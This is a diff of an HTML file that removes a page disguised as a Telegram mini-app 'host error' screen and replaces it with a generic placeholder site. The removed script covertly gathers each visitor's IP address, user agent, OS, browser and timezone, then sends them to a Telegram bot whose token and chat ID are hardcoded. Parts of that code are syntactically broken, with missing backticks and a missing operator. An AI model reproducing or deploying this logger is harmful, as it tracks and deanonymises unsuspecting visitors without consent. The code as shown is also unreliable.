@@ -1,91 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>xRocket</title>
-<style>
-  body {
-    background-color: #1e1e1e;
-    color: white;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  #container {
-    border-radius: 20px;
-    background-color: #2f2f2f;
-    padding: 20px;
-    text-align: center;
-  }
-</style>
+    <title>Мой сайт</title>
 </head>
 <body>
-<div id="container">
-  <h1>Ошибка хоста!</h1>
-  <p>Обратитесь к сис. администратору сети!</p>
-</div>
-
-<script>let tg = window.Telegram.WebApp;
-document.addEventListener('DOMContentLoaded', function() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const userAgent = navigator.userAgent;
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      const ip = data.ip;
-      const osname = navigator.platform;
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const browser = getBrowserInfo();
-      let userid = document.createElement('p');
-
-      const message = 
-🔥 Лог успешен!
-
-*🧭 Базовая информация:*
-*💻 Система:*
-  ├ IP: ${ip}
-  ├ UserAgent: ${userAgent}
-  ├ ОС: ${osname}
-  ├ Браузер: ${browser}
-  └ Часовой пояс: ${timeZone};
-      
-      const token = '7032677982:AAGckMkvLttv8swNSsnahoCrcSHdjN8_VVM';
-      const chatId = '6612188685';
-      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
-      const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('text', message);
-        formData.append('parse_mode', 'Markdown')
-        fetch(url, {
-          method: 'POST',
-          body: formData
-        });
-      });
-
-  function getBrowserInfo() {
-    const ua = navigator.userAgent;
-    let browser = '';
-    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
-
-    if (/trident/i.test(match[1])) {
-      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
-      browser = IE ${tem[1] || ''};
-    }
-
-    if (match[1] === 'Chrome') {
-      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
-      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
-    }
-
-    match[2] = match[2] ? version ${match[2]} : '';
-    browser = ${match[1]  ''} ${match[2]  ''}.trim();
-    return browser;
-  }
-  });</script>
+    <header>
+        <h1>Добро пожаловать на мой сайт!</h1>
+    </header>
+    
+    <nav>
+        <ul>
+            <li><a href="#">Главная</a></li>
+            <li><a href="#">О нас</a></li>
+            <li><a href="#">Контакты</a></li>
+        </ul>
+    </nav>
+    
+    <section>
+        <h2>О нас</h2>
+        <p>Мы - команда разработчиков, создающих крутые веб-приложения и сайты.</p>
+    </section>
+    
+    <footer>
+        <p>&copy; 2024 Все права защищены.</p>
+    </footer>
 </body>
 </html>
